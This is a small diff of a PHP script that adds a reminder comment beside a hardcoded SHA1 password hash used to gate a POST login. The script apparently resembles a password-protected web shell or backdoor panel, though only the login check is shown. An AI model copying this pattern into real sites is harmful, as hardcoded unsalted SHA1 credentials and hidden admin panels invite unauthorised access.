@@ -479,7 +479,7 @@ $jquery_version = '3.7.1';
 $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@' . $jquery_version . '/dist/jquery.min.js';
 $ajax_version = '3.5.1';
 $ajax = 'https://ajax.googleapis.com/ajax/libs/jquery/' . $ajax_version . '/jquery.min.js';
-$passwd = 'c62782a8e5dd7c4cffef6ba35233b5846a3db219';
+$passwd = 'c62782a8e5dd7c4cffef6ba35233b5846a3db219'; //change this password
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['gasken'])) {
     if (SHA1($_POST['passnya']) == $passwd) {
